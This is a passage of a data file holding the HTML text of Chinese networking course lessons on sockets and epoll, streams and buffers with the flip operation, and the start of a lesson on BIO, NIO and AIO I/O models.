协议等）？</p>\n</li>\n<li data-nodeid="103523">\n<p data-nodeid="103524">小型局域网是怎样工作的（交换机和路由器）？</p>\n</li>\n<li data-nodeid="103525">\n<p data-nodeid="103526">中型局域网如何工作的？</p>\n</li>\n<li data-nodeid="103527">\n<p data-nodeid="103528">局域网如何对接外网（NAT）？</p>\n</li>\n<li data-nodeid="103529">\n<p data-nodeid="103530">互联网中如何定位设备和网络（IP 协议的路由和寻址是如何工作的）？</p>\n</li>\n</ol>\n<p data-nodeid="103531">通过上面这样的一个分层的总结，你可以逐层分析下自己是否已经理解了这个模块最核心的内容。这部分知识最大的价值在于平时在遇到网络问题时，可以找到一些思考方向。比如说为什么部分产品要解决 NAT 穿透的问题？网吧的用户会遇到什么问题？为什么你 Ping 不通同一个局域网的另一台机器？</p>\n<p data-nodeid="103532">到这里，传输层协议和网络层协议就介绍完了，它们是计算机网络最底层的基础知识，建议你踏实学习，打好基础。</p>\n<p data-nodeid="103533">发现求知的乐趣，我是林䭽，感谢你学习本次课程。 接下来我们将进入《模块三：网络编程》的学习，下一讲介绍“10 | Socket 编程：epoll 为什么用红黑树？”，再见！</p>',
        article_title: "加餐 | 模块二思考题解答",
        title: "加餐 | 模块二思考题解答",
        id: 7275,
      },
    ],
  },
  {
    chapterTitle: "模块三：网络编程",
    children: [
      {
        content:
          '<p data-nodeid="833" class="">不知道平时你做网络编程的时候有没有碰到过 Socket 对象？或者在配置代理的时候，有没有碰到配置 Socket 地址？当你看到服务端 Socket、客户端 Socket 等名词时，是否可以明确理解这些概念？</p>\n<p data-nodeid="834">除了上面这些概念，你还经常会碰到 I/O 模型、异步编程、内存映射等概念。再往更深层次学习，你还会碰到 epoll/select 等编程模型。</p>\n<p data-nodeid="835">不知道我说了这么多，会不会让你有一种一团糟的感觉——其实学习好这些知识有一条主线，就是<strong data-nodeid="904">抓住操作系统对 Socket 文件的设计</strong>。那么这一讲，我们就以“<strong data-nodeid="905">epoll 为什么用红黑树</strong>”为引，开启今天的学习，将这部分知识一网打尽！</p>\n<h3 data-nodeid="836">Socket 是什么？</h3>\n<p data-nodeid="837">首先，Socket 是一种编程的模型。</p>\n<p data-nodeid="838">下图中，从编程的角度来看，客户端将数据发送给在客户端侧的<strong data-nodeid="917">Socket 对象</strong>，然后客户端侧的 Socket 对象将数据发送给服务端侧的 Socket 对象。<strong data-nodeid="918">Socket 对象负责提供通信能力，并处理底层的 TCP 连接/UDP 连接</strong>。对服务端而言，每一个客户端接入，就会形成一个和客户端对应的 Socket 对象，如果服务器要读取客户端发送的信息，或者向客户端发送信息，就需要通过这个客户端 Socket 对象。</p>\n<p data-nodeid="839"><img src="https://s0.lgstatic.com/i/image6/M01/3E/7B/Cgp9HWCZ8deAY_UqAAFeGtcsKIg099.png" alt="Drawing 1.png" data-nodeid="921"></p>\n<p data-nodeid="840" class=""><strong data-nodeid="926">但是如果从另一个角度去分析，Socket 还是一种文件，准确来说是一种双向管道文件</strong>。什么是管道文件呢？管道会将一个程序的输出，导向另一个程序的输入。那么什么是双向管道文件呢？双向管道文件连接的程序是对等的，都可以作为输入和输出。</p>\n<p data-nodeid="841">比如下面这段服务端侧程序：</p>\n<pre class="lang-java" data-nodeid="842"><code data-language="java"><span class="hljs-keyword">var</span> serverSocket = <span class="hljs-keyword">new</span> ServerSocket();\nserverSocket.bind(<span class="hljs-keyword">new</span> InetSocketAddress(<span class="hljs-number">80</span>));\n</code></pre>\n<p data-nodeid="843">看起来我们创建的是一个服务端 Socket 对象，但如果单纯看这个对象，它又代表什么呢？如果我们理解成代表服务端本身合不合理呢——这可能会比较抽象，在服务端存在一个服务端 Socket。但如果我们从管道文件的层面去理解它，就会比较容易了。其一，这是一个文件；其二，它里面存的是所有客户端 Socket 文件的文件描述符。</p>\n<p data-nodeid="844">当一个客户端连接到服务端的时候，操作系统就会创建一个客户端 Socket 的文件。然后操作系统将这个文件的文件描述符写入服务端程序创建的服务端 Socket 文件中。服务端 Socket 文件，是一个管道文件。如果读取这个文件的内容，就相当于从管道中取走了一个客户端文件描述符。</p>\n<p data-nodeid="845"><img src="https://s0.lgstatic.com/i/image6/M01/3E/7B/Cgp9HWCZ8eSANiNKAAHGwf-mH5U069.png" alt="Drawing 3.png" data-nodeid="932"></p>\n<p data-nodeid="846">如上图所示，服务端 Socket 文件相当于一个客户端 Socket 的目录，线程可以通过 accept() 操作每次拿走一个客户端文件描述符。拿到客户端文件描述符，就相当于拿到了和客户端进行通信的接口。</p>\n<p data-nodeid="847">前面我们提到 Socket 是一个双向的管道文件，当线程想要读取客户端传输来的数据时，就从客户端 Socket 文件中读取数据；当线程想要发送数据到客户端时，就向客户端 Socket 文件中写入数据。<strong data-nodeid="939">客户端 Socket 是一个双向管道，操作系统将客户端传来的数据写入这个管道，也将线程写入管道的数据发送到客户端</strong>。</p>\n<p data-nodeid="848">有同学会说，那既然可以双向传送，这不就是两个单向管道被拼凑在了一起吗？这里具体的实现取决于操作系统，Linux 中的管道文件都是单向的，因此 Socket 文件是一种区别于原有操作系统管道的单独的实现。</p>\n<p data-nodeid="849">总结下，Socket 首先是文件，存储的是数据。对服务端而言，分成服务端 Socket 文件和客户端 Socket 文件。服务端 Socket 文件存储的是客户端 Socket 文件描述符；客户端 Socket 文件存储的是传输的数据。读取客户端 Socket 文件，就是读取客户端发送来的数据；写入客户端文件，就是向客户端发送数据。对一个客户端而言， Socket 文件存储的是发送给服务端（或接收的）数据。</p>\n<p data-nodeid="850"><strong data-nodeid="946">综上，Socket 首先是文件，在文件的基础上，又封装了一段程序，这段程序提供了 API 负责最终的数据传输</strong>。</p>\n<h3 data-nodeid="851">服务端 Socket 的绑定</h3>\n<p data-nodeid="852">为了区分应用，对于一个服务端 Socket 文件，我们要设置它监听的端口。比如 Nginx 监听 80 端口、Node 监听 3000 端口、SSH 监听 22 端口、Tomcat 监听 8080 端口。端口监听不能冲突，不然客户端连接进来创建客户端 Socket 文件，文件描述符就不知道写入哪个服务端 Socket 文件了。这样操作系统就会把连接到不同端口的客户端分类，将客户端 Socket 文件描述符存到对应不同端口的服务端 Socket 文件中。</p>\n<p data-nodeid="853"><strong data-nodeid="953">因此，服务端监听端口的本质，是将服务端 Socket 文件和端口绑定，这个操作也称为 bind</strong>。有时候我们不仅仅绑定端口，还需要绑定 IP 地址。这是因为有时候我们只想允许指定 IP 访问我们的服务端程序。</p>\n<h3 data-nodeid="854">扫描和监听</h3>\n<p data-nodeid="855">对于一个服务端程序，可以定期扫描服务端 Socket 文件的变更，来了解有哪些客户端想要连接进来。如果在服务端 Socket 文件中读取到一个客户端的文件描述符，就可以将这个文件描述符实例化成一个 Socket 对象。</p>\n<p data-nodeid="856"><img src="https://s0.lgstatic.com/i/image6/M01/3E/83/CioPOWCZ8fOAaVwEAAJ4CITeHSs003.png" alt="Drawing 5.png" data-nodeid="958"></p>\n<p data-nodeid="3131" class="te-preview-highlight">之后，服务端可以将这个 Socket 对象加入一个容器（集合），通过定期遍历所有的客户端 Socket 对象，查看背后 Socket 文件的状态，从而确定是否有新的数据从客户端传输过来。</p>\n\n\n\n\n\n\n<p data-nodeid="858"><img src="https://s0.lgstatic.com/i/image6/M01/3E/7B/Cgp9HWCZ8fyAJIK7AAFzaGqyFsw603.png" alt="Drawing 7.png" data-nodeid="962"></p>\n<p data-nodeid="859">上述的过程，我们通过一个线程就可以响应多个客户端的连接，也被称作<strong data-nodeid="968">I/O 多路复用技术</strong>。</p>\n<h3 data-nodeid="860">响应式（Reactive）</h3>\n<p data-nodeid="861">在 I/O 多路复用技术中，服务端程序（线程）需要维护一个 Socket 的集合（可以是数组、链表等），然后定期遍历这个集合。这样的做法在客户端 Socket 较少的情况下没有问题，但是如果接入的客户端 Socket 较多，比如达到上万，那么每次轮询的开销都会很大。</p>\n<p data-nodeid="862">从程序设计的角度来看，像这样主动遍历，比如遍历一个 Socket 集合看看有没有发生写入（有数据从网卡传过来），称为<strong data-nodeid="976">命令式的程序</strong>。这样的程序设计就好像在执行一条条命令一样，程序主动地去查看每个 Socket 的状态。</p>\n<p data-nodeid="863"><img src="https://s0.lgstatic.com/i/image6/M01/3E/83/CioPOWCZ8gOAF9JRAAGL-Tmkapc159.png" alt="Drawing 9.png" data-nodeid="979"></p>\n<p data-nodeid="864">命令式会让负责下命令的程序负载过重，例如，在高并发场景下，上述讨论中循环遍历 Socket 集合的线程，会因为负担过重导致系统吞吐量下降。</p>\n<p data-nodeid="865">与命令式相反的是响应式（Reactive），响应式的程序就不会有这样的问题。在响应式的程序当中，每一个参与者有着独立的思考方式，就好像拥有独立的人格，可以自己针对不同的环境触发不同的行为。</p>\n<p data-nodeid="866">从响应式的角度去看 Socket 编程，应该是有某个观察者会观察到 Socket 文件状态的变化，从而通知处理线程响应。线程不再需要遍历 Socket 集合，而是等待观察程序的通知。</p>\n<p data-nodeid="867"><img src="https://s0.lgstatic.com/i/image6/M01/3E/7B/Cgp9HWCZ8g6AGZmTAAFsEY8h8Ho635.png" alt="Drawing 11.png" data-nodeid="985"></p>\n<p data-nodeid="868">当然，最合适的观察者其实是操作系统本身，因为只有操作系统非常清楚每一个 Socket 文件的状态。原因是对 Socket 文件的读写都要经过操作系统。在实现这个模型的时候，有几件事情要注意。</p>\n<ol data-nodeid="869">\n<li data-nodeid="870">\n<p data-nodeid="871">线程需要告诉中间的观察者自己要观察什么，或者说在什么情况下才响应？比如具体到哪个 Socket 发生了什么事件？是读写还是其他的事件？这一步我们通常称为<strong data-nodeid="992">注册</strong>。</p>\n</li>\n<li data-nodeid="872">\n<p data-nodeid="873">中间的观察者需要实现一个高效的数据结构（通常是基于红黑树的二叉搜索树）。这是因为中间的观察者不仅仅是服务于某个线程，而是服务于很多的线程。当一个 Socket 文件发生变化的时候，中间观察者需要立刻知道，究竟是哪个线程需要这个信息，而不是将所有的线程都遍历一遍。</p>\n</li>\n</ol>\n<h4 data-nodeid="874">为什么用红黑树？</h4>\n<p data-nodeid="875">关于为什么要红黑树，这里我给你再仔细解释一下。考虑到中间观察者最核心的诉求有两个。</p>\n<p data-nodeid="876"><strong data-nodeid="1000">第一个核心诉求，是让线程可以注册自己关心的消息类型</strong>。比如线程对文件描述符 =123 的 Socket 文件读写都感兴趣，会去中间观察者处注册。当 FD=123 的 Socket 发生读写时，中间观察者负责通知线程，这是一个响应式的模型。</p>\n<p data-nodeid="877"><strong data-nodeid="1005">第二个核心诉求，是当 FD=123 的 Socket 发生变化（读写等）时，能够快速地判断是哪个线程需要知道这个消息</strong>。</p>\n<p data-nodeid="878">所以，中间观察者需要一个快速能插入（注册过程）、查询（通知过程）一个整数的数据结构，这个整数就是 Socket 的文件描述符。综合来看，能够解决这个问题的数据结构中，跳表和二叉搜索树都是不错的选择。</p>\n<p data-nodeid="879">因此，在 Linux 的 epoll 模型中，选择了红黑树。红黑树是二叉搜索树的一种，红与黑是红黑树的实现者才关心的内容，对于我们使用者来说不用关心颜色，Java 中的 TreeMap 底层就是红黑树。</p>\n<h3 data-nodeid="880">总结</h3>\n<p data-nodeid="881">总结一下，<strong data-nodeid="1014">Socket 既是一种编程模型，或者说是一段程序，同时也是一个文件，一个双向管道文件</strong>。你也可以这样理解，Socket API 是在 Socket 文件基础上进行的一层封装，而 Socket 文件是操作系统提供支持网络通信的一种文件格式。</p>\n<p data-nodeid="882">在服务端有两种 Socket 文件，每个客户端接入之后会形成一个客户端的 Socket 文件，客户端 Socket 文件的文件描述符会存入服务端 Socket 文件。通过这种方式，一个线程可以通过读取服务端 Socket 文件中的内容拿到所有的客户端 Socket。这样一个线程就可以负责响应所有客户端的 I/O，这个技术称为 I/O 多路复用。</p>\n<p data-nodeid="883">主动式的 I/O 多路复用，对负责 I/O 的线程压力过大，因此通常会设计一个高效的中间数据结构作为 I/O 事件的观察者，线程通过订阅 I/O 事件被动响应，这就是响应式模型。在 Socket 编程中，最适合提供这种中间数据结构的就是操作系统的内核，事实上 epoll 模型也是在操作系统的内核中提供了红黑树结构。</p>\n<p data-nodeid="884"><strong data-nodeid="1021">现在你可以尝试来回答本讲关联的面试题目：epoll 为什么用红黑树</strong>？</p>\n<p data-nodeid="885">【<strong data-nodeid="1027">解析</strong>】在 Linux 的设计中有三种典型的 I/O 多路复用模型 select、poll、epoll。</p>\n<p data-nodeid="886">select 是一个主动模型，需要线程自己通过一个集合存放所有的 Socket，然后发生 I/O 变化的时候遍历。在 select 模型下，操作系统不知道哪个线程应该响应哪个事件，而是由线程自己去操作系统看有没有发生网络 I/O 事件，然后再遍历自己管理的所有 Socket，看看这些 Socket 有没有发生变化。</p>\n<p data-nodeid="887">poll 提供了更优质的编程接口，但是本质和 select 模型相同。因此千级并发以下的 I/O，你可以考虑 select 和 poll，但是如果出现更大的并发量，就需要用 epoll 模型。</p>\n<p data-nodeid="888">epoll 模型在操作系统内核中提供了一个中间数据结构，这个中间数据结构会提供事件监听注册，以及快速判断消息关联到哪个线程的能力（红黑树实现）。因此在高并发 I/O 下，可以考虑 epoll 模型，它的速度更快，开销更小。</p>\n<h3 data-nodeid="889">思考题</h3>\n<p data-nodeid="890"><strong data-nodeid="1036">最后再给你出一道需要查资料的思考题目：请你找一个 epoll 的 hello world 例子，并尝试理解它</strong>。</p>\n<p data-nodeid="891">我建议你花些时间真正地思考一番，然后把答案整理在留言区，我们一起讨论。如果你对本次课程有什么建议和疑问，可以在评论区留言。如果你有所收获，也可以推荐给你的朋友。</p>\n<p data-nodeid="892" class="">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲我们将学习“11 | 流和缓冲区：缓冲区的 flip 是怎么回事？” ，再见！</p>',
        article_title: "10 | Socket 编程：epoll 为什么用红黑树？",
        title: "10 | Socket 编程：epoll 为什么用红黑树？",
        id: 7276,
      },
      {
        content:
          '<p data-nodeid="35793"><strong data-nodeid="35866">流和缓冲区都是用来描述数据的</strong>。计算机中，数据往往会被抽象成流，然后传输。比如读取一个文件，数据会被抽象成文件流；播放一个视频，视频被抽象成视频流。处理节点为了防止过载，又会使用缓冲区削峰（减少瞬间压力）。在传输层协议当中，应用往往先把数据放入缓冲区，然后再将缓冲区提供给发送数据的程序。发送数据的程序，从缓冲区读取出数据，然后进行发送。</p>\n<p data-nodeid="35794">流和缓冲区几乎是学习所有语言的程序员都会接触到的东西，也是面试的重点。这一讲，就请你以“缓冲区的 flip 操作是怎么回事”为引，开启今天的学习，把这部分知识一网打尽。</p>\n<h3 data-nodeid="35795">流</h3>\n<p data-nodeid="35796"><strong data-nodeid="35873">流代表数据，具体来说是随着时间产生的数据，类比自然界的河流</strong>。你不知道一个流什么时候会完结，直到你将流中的数据都读完。</p>\n<p data-nodeid="35797">读取文件的时候，文件被抽象成流。流的内部构造，决定了你每次能从文件中读取多少数据。从流中读取数据的操作，本质上是一种迭代器。流的内部构造决定了迭代器每次能读出的数据规模。比如你可以设计一个读文件的流，每次至少会读出 4k 大小，也可以设计一个读文件的程序，每次读出一个字节大小。</p>\n<p data-nodeid="35798">通常情况读取数据的流，是读取流；写入数据的流，是写入流。那么一个写入流还能被理解成随着时间产生的数据吗？其实是一样的，随着时间产生的数据，通过写入流写入某个文件，或者被其他线程、程序拿走使用。</p>\n<p data-nodeid="36948"><strong data-nodeid="36953">这里请你思考一个问题：流中一定有数据吗</strong>？看上去的确是这样。对于文件流来说，打开一个文件，形成读取流。读取流的本质当然是内存中的一个对象。当用户读取文件内容的时候，实际上是通过流进行读取，看上去好像从流中读取了数据，而本质上读取的是文件的数据。从这个角度去观察整体的设计，数据从文件到了流，然后再到了用户线程，因此数据是经过流的。</p>\n\n\n<p data-nodeid="35801"><strong data-nodeid="35885">但是仔细思考这个问题，可不可以将数据直接从文件传输到用户线程呢</strong>？比如流对象中只设计一个整数型指针，一开始指向文件的头部，每次发生读取，都从文件中读出内容，然后再返回给用户线程。做完这次操作，指针自增。通过这样的设计，流中就不需要再有数据了。可见，流中不一定要有数据。再举一个极端的例子，如果我们设计一个随机数的产生流，每次读取流中的数据，都调用随机数函数生成一个随机数并返回，那么流中也不需要有数据的存储。</p>\n<h3 data-nodeid="35802">为什么要缓冲区？</h3>\n<p data-nodeid="35803">在上面的例子当中，我们讨论的时候发现，<strong data-nodeid="35892">设计文件流时，可以只保留一个位置指针，不用真的将整个文件都读入内存</strong>，像下图这样：</p>\n<p data-nodeid="37862" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3F/41/CioPOWCc7EGAXTgYAAA-VYH_0W4280.png" alt="image (1).png" data-nodeid="37869"></p>\n\n\n\n<p data-nodeid="35806">把文件看作是一系列线性排列连续字节的合集，用户线程调用流对象的读取数据方法，每次从文件中读取一个字节。流中只保留一个读取位置 position，指向下一个要读取的字节。</p>\n<p data-nodeid="35807">看上去这个方案可行，但实际上性能极差。因为从文件中读取数据这个操作，是一次磁盘的 I/O 操作，非常耗时。正确的做法是每次读取 2k、4k 这样大小的数据，这是因为操作系统中的内存分页通常是这样的大小，而磁盘的读写往往是会适配页表大小。而且现在的文件系统主要都是日志文件系统，存储的并不是原始数据本身，也就是说多数情况下你看到的文件并不是一个连续紧密的字节线性排列，而是日志。关于这块内容，具体可以参考<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="35903">《重学操作系统》</a>中<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=478#/detail/pc?id=4640&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="35907">《30  | 文件系统的底层实现：FAT、NTFS 和 Ext3 有什么区别》</a>。</p>\n<p data-nodeid="35808">如果你不想花时间再去完整地学习一遍“操作系统”相关的内容，我这里先给一个结论：当你向磁盘读取 2k 数据，读取到的不一定是 2k 实际的数据，很有可能会比 2k 少，这是因为文件内容是以日志形式存储，会有冗余。</p>\n<p data-nodeid="35809">我们用下面这张图来描述下需求：</p>\n<p data-nodeid="38326" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3F/38/Cgp9HWCc7EuAEXd-AABijDxq3f0281.png" alt="image (2).png" data-nodeid="38333"></p>\n\n\n<p data-nodeid="35812">如上图所示，内核每次从文件系统中读取到的数据是确定的，但是里边的有效数据是不确定的。流对象的设计，至少应该支持两种操作：一种是读取一个字节，另一种是读取多个字节。而无论读取一个字节还是读取多个字节，都应该适配内核的底层行为。也就是说，每次流对象读取一个字节，内核可能会读取 2k、4k 的数据。这样的行为，才能真的做到减少磁盘的 I/O 操作。那么有同学可能会问：<strong data-nodeid="35922">内核为什么不一次先读取几兆数据或者读取更大的数据呢</strong>？这有两个原因。</p>\n<ol data-nodeid="35813">\n<li data-nodeid="35814">\n<p data-nodeid="35815">如果是高并发场景下，并发读取数据时内存使用是根据并发数翻倍的，如果同时读取的数据量过大，可能会导致内存不足。</p>\n</li>\n<li data-nodeid="35816">\n<p data-nodeid="35817">读取比 2k/4k……大很多倍的数据，比如 1M/2M 这种远远大于内存分页大小的数据，并不能提升性能。</p>\n</li>\n</ol>\n<p data-nodeid="38790" class="">所以最后我们的解决办就是创建两个缓冲区。<br>\n<img src="https://s0.lgstatic.com/i/image6/M00/3F/41/CioPOWCc7FOAY74mAABunaVJG8c103.png" alt="image (3).png" data-nodeid="38799"></p>\n\n\n<p data-nodeid="35820">上图中内核中的缓冲区，用于缓冲读取文件中的数据。流中的缓冲区，用于缓冲内核中拷贝过来的数据。有同学可能不理解，为什么不把内核的缓冲区直接给到流呢？这是因为流对象工作在用户空间，内核中的缓冲区工作在内核空间。用户空间的程序不可以直接访问内核空间的数据，这是操作系统的一种保护策略。具体可以参考<a href="https://shenceyun.lagou.com/t/Axo?fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="35932">《重学操作系统》</a>中<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=478#/detail/pc?id=4621&amp;fileGuid=xxQTRXtVcqtHK6j8" data-nodeid="35936">《14 | 用户态和内核态：用户态线程和内核态线程有什么区别？》</a>，这里不再赘述。</p>\n<p data-nodeid="35821">当然也存在一种叫作内存映射的方式，就是内核通过内存映射，直接将内核空间中的一块内存区域分享给用户空间只读使用，这样的方式可以节省一次数据拷贝。这个能力在 Java 的 NIO 中称作 DirectMemory，对应 C 语言是 mmap。</p>\n<h3 data-nodeid="35822">缓冲区</h3>\n<p data-nodeid="35823">上面的设计中，我们已经开始用缓冲区解决问题了。那么具体什么是缓冲区呢？<strong data-nodeid="35945">缓冲区就是一块用来做缓冲的内存区域</strong>。在上面的例子当中，为了应对频繁的字节读取，我们在内存当中设置一个 2k 大小缓冲区。这样读取 2048 次，才会真的发生一次读取。同理，如果应对频繁的字节写入，也可以使用缓冲区。</p>\n<p data-nodeid="35824">不仅仅如此，比如说你设计一个秒杀系统，如果同时到达的流量过高，也可以使用缓冲区将用户请求先存储下来，再进行处理。这个操作我们称为<strong data-nodeid="35951">削峰</strong>，削去流量的峰值。</p>\n<p data-nodeid="35825">缓冲区中的数据通常具有朴素的公平，说白了就是排队，先进先出（FIFO）。从数据结构的设计上，缓冲区像一个队列。在实际的使用场景中，缓冲区有一些自己特别的需求，比如说缓冲区需要被重复利用。多次读取数据，可以复用一个缓冲区，这样可以节省内存，也可以减少分配和回收内存的开销。</p>\n<p data-nodeid="35826">举个例子：读取一个流的数据到一个缓冲区，然后再将缓冲区中的数据交给另一个流。 比如说读取文件流中的数据交给网络流发送出去。首先，我们要将文件流的数据写入缓冲区，然后网络流会读取缓冲区中的数据。这个过程会反反复复进行，直到文件内容全部发送。</p>\n<p data-nodeid="39264" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3F/39/Cgp9HWCc7FyAXfXEAAAq7KmWVB0551.png" alt="image (4).png" data-nodeid="39271"></p>\n\n<p data-nodeid="35828">这个设计中，缓冲区需要支持这几种操作：</p>\n<ol data-nodeid="35829">\n<li data-nodeid="35830">\n<p data-nodeid="35831">写入数据</p>\n</li>\n<li data-nodeid="35832">\n<p data-nodeid="35833">读出数据</p>\n</li>\n<li data-nodeid="35834">\n<p data-nodeid="35835">清空（应对下一次读写）</p>\n</li>\n</ol>\n<p data-nodeid="35836">那么具体怎么设计这个缓冲区呢？首先，数据可以考虑存放到一个数组中，下图是可以存 8 个字节的缓冲区：</p>\n<p data-nodeid="39744" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3F/41/CioPOWCc7GKALJE3AAAiBCuuQGs788.png" alt="image (5).png" data-nodeid="39751"></p>\n\n<p data-nodeid="35838">写入数据的时候，需要一个指针指向下一个可以写入的位置，如下图所示：</p>\n<p data-nodeid="40232" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3F/39/Cgp9HWCc7GmAPDUjAAAp4S0qvO4882.png" alt="image (6).png" data-nodeid="40239"></p>\n\n<p data-nodeid="35840">每次写入数据，position 增 1，比如我们顺序写入 a,b,c,d 后，缓冲区如下图所示：</p>\n<p data-nodeid="40728" class=""><img src="https://s0.lgstatic.com/i/image6/M00/3F/41/CioPOWCc7G6AR_IPAAAsmx_1ZgU002.png" alt="image (7).png" data-nodeid="40735"></p>\n\n<p data-nodeid="35842">那么如果这个时候，要切换到读取状态该怎么做呢？再增加一个读取指针吗？聪明的设计者想到了一个办法，增加一个 limit 指针，随着写入指针一起增长，如下图所示：</p>\n<p data-nodeid="41232" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3F/39/Cgp9HWCc7I6AG-eIAAAybpue6JE861.png" alt="image (8).png" data-nodeid="41239"></p>\n\n<p data-nodeid="35844">当需要切换到读取状态的时候，将 position 设置为 0，limit 不变即可。下图中，我们可以从 0 开始读取数据，每次读取 position 增 1。</p>\n<p data-nodeid="41744" class=""><img src="https://s0.lgstatic.com/i/image6/M01/3F/39/Cgp9HWCc7JeAcU-TAAAyI3T_OMM716.png" alt="image (9).png" data-nodeid="41751"></p>\n\n<p data-nodeid="35846">我们将 position 设置为 0，limit 不变的操作称为<code data-backticks="1" data-nodeid="35982">flip</code>操作，flip 本意是翻转，在这个场景中是读、写状态的切换。</p>\n<p data-nodeid="35847">读取操作可以控制循环从 position 一直读取到 limit，这样就可以读取出 a,b,c,d。那么如果要继续写入应该如何操作呢？ 这个时候就需要用到缓冲区的<code data-backticks="1" data-nodeid="35985">clear</code>操作，这个操作会清空缓冲区。具体来说，<code data-backticks="1" data-nodeid="35987">clear</code>操作会把 position,limit 都设置为 0，而不需要真的一点点擦除缓冲区中已有的值，就可以做到重复利用缓冲区了。</p>\n<p data-nodeid="35848"><strong data-nodeid="35996">写入过程从 position = 0 开始，position 和 limit 一起自增。读取时，用</strong><code data-backticks="1" data-nodeid="35992">flip</code>操作切换缓冲区读写状态。读取数据完毕，用<code data-backticks="1" data-nodeid="35994">clear</code>操作重置缓冲区状态。</p>\n<h3 data-nodeid="42264">总结</h3>\n\n\n<p data-nodeid="35851">总结一下，<strong data-nodeid="36003">流是随着时间产生的数据。数据抽象成流，是因为客观世界存在着这样的现象</strong>。数据被抽象成流之后，我们不需要把所有的数据都读取到内存当中进行计算和迭代，而是每次处理或者计算一个缓冲区的数据。</p>\n<p data-nodeid="35852"><strong data-nodeid="36008">缓冲区的作用是缓冲，它在高频的 I/O 操作中很有意义</strong>。针对不同场景，也不只有这一种缓冲区的设计，比如用双向链表实现队列（FIFO 结构）可以作为缓冲区；Redis 中的列表可以作为缓冲区；RocketMQ，Kafka 等也可以作为缓冲区。针对某些特定场景，比如高并发场景下的下单处理，可能会用订单队列表（MySQL 的表）作为缓冲区。</p>\n<p data-nodeid="35853">因此从这个角度来说，作为开发者我们首先要有缓冲的意识，去减少 I/O 的次数，提升 I/O 的性能，然后才是思考具体的缓冲策略。</p>\n<p data-nodeid="35854"><strong data-nodeid="36014">那么通过这一讲的学习，你可以尝试来回答本讲关联的面试题目：缓冲区的 flip 操作是怎么回事</strong>？</p>\n<p data-nodeid="35855">【<strong data-nodeid="36020">解析</strong>】flip 操作意味翻转，是切换缓冲区的读写状态，在 flip 操作中，通常将 position 指针置 0，limit 指针不变。</p>\n<h3 data-nodeid="35856">思考题</h3>\n<p data-nodeid="35857">再给你出一道需要查资料的思考题目，在缓冲区的设计当中，还通常有一个 rewind 操作，这个操作是用来做什么的呢？</p>\n\n<p data-nodeid="35859">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲我们将学习《12 | 网络 I/O 模型：BIO、NIO 和 AIO 有什么区别？》，再见！</p>',
        article_title: "11 | 流和缓冲区：缓冲区的 flip 是怎么回事？",
        title: "11 | 流和缓冲区：缓冲区的 flip 是怎么回事？",
        id: 7277,
      },
      {
        content:
          '<p data-nodeid="43286">我们在处理网络问题时，经常是处理 I/O 问题——输入和输出。看上去很复杂，但说白了就是如何把网卡收到的数据给到指定的程序，然后程序如何将数据拷贝到网卡。</p>\n<p data-nodeid="43287">在处理 I/O 的时候，要结合具体的场景来思考程序怎么写。从程序的 API 设计上，我们经常会看到 3 类设计：BIO、NIO 和 AIO，<strong data-nodeid="43359">这也是本讲关联的一道高频面试题目：BIO、NIO 和 AIO 有什么区别</strong>？</p>\n<p data-nodeid="43288">从本质上说，讨论 BIO、NIO、AIO 的区别，其实就是在讨论 I/O 的模型，我们可以从下面 3 个方面来思考 。</p>\n<ol data-nodeid="43289">\n<li data-nodeid="43290">\n<p data-nodeid="43291">编程模型：合理设计 API，让程序写得更舒服。</p>\n</li>\n<li data-nodeid="43292">\n<p data-nodeid="43293">数据的传输和转化成本：比如减少数据拷贝次数，合理压缩数据等。</p>\n</li>\n<li data-nodeid="43294">\n<p data-nodeid="43295">高效的数据结构：利用好缓冲区、红黑树等（见本讲后续讨论）。</p>\n</li>\n</ol>\n<h3 data-nodeid="43296">I/O 的编程模型</h3>\n<p data-nodeid="43297">我们先从编程模型上讨论下 BIO、NIO 和 AIO 的区别。</p>\n<p data-nodeid="43298">BIO（Blocking I/O，阻塞 I/O），API 的设计会阻塞程序调用。比如：</p>\n<pre class="lang-java" data-nodeid="43299"><code data-language="java"><span class="hljs-keyword">byte</span> a = readKey()\n</code></pre>\n<p data-nodeid="43300">假设<code data-backticks="1" data-nodeid="43368">readKey</code>方法会从键盘中读取一个用户的按键，如果是阻塞 I/O 的设计，ReadKey 会阻塞当前用户线程直到用户按键。这个阻塞指的是线程进入<strong data-nodeid="43382">阻塞态</strong>。进入阻塞态的线程，状态会被存在内存中，执行会被中断，也就是不会占用 CPU å资源。阻塞态的线程要恢复执行，先要进入<strong data-nodeid="43383">就绪态</strong>排队，然后轮到自己才能够继续执行。从一个线程执行切换到另一个线程执行，也叫作<strong data-nodeid="43384">线程的上下文切换</strong>（Context Switch），是一个相对耗时的操作。</p>\n<p data-nodeid="43301">再说说 NIO （None Blocking I/O，非阻塞 IO），API 的设计不会阻塞程序的调用，比如：</p>\n<pre class="lang-java" data-nodeid="43302"><code data-language="java"><span class="hljs-keyword">byte</span> a = readKey()\n</code></pre>\n<p data-nodeid="43303">假设<code data-backticks="1" data-nodeid="43387">readKey</code>方法从键盘读取一个按键，如果是非阻塞 I/O 的设计，<code data-backticks="1" data-nodeid="43389">readKey</code>不会阻塞当前的线程。你可能会问：那如果用户没有按键怎么办？在阻塞 I/O 的设计中，如果用户没有按键线程会阻塞等待用户按键，在非阻塞 I/O 的设计中，线程不会阻塞，没有按键会返回一个空值，比如 null。</p>\n<p data-nodeid="43304">最后我们说说 AIO（Asynchronous I/O， 异步 I/O），API 的设计会多创造一条时间线。比如：</p>\n<pre data-nodeid="43305"><code>func callBackFunction(byte keyCode) {\n  // 处理按键\n}\nreadKey( callBackFunction )\n</code></pre>\n<p data-nodeid="43306">在异步 I/O 中，<code data-backticks="1" data-nodeid="43393">readKey</code>方法会直接返回，但是没有结果。结果需要一个回调函数<code data-backticks="1" 